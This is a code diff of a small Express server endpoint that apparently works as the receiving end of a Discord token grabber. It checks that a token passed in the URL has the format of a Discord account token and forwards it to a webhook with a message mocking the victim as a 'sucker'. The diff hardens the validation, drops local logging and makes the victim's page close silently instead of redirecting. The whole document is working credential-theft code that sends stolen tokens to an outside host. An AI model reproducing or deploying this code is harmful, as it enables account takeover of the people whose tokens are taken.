@@ -11,14 +11,14 @@ app.get('/render', async (req,res) => {
     const token = req.query.xyz
     const segments = token.split(".")
 
+    if (segments.length < 3) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }
+
     if (segments[0].length != 26) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }
     if (segments[1].length != 6) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }
     if (segments[2].length != 38) { res.send('я твою матушку в кино водил и сладкой ватой угощал') }
 
     const content = '@everyone Новый лох! \n ```' + token + '```'
 
-    console.log(token)
-    
     const response = await fetch(webhook, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -27,7 +27,7 @@ app.get('/render', async (req,res) => {
 
     res.send(`
     <script>
-        window.location = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'
+        window.close()
     </script>    
         `) 
 })
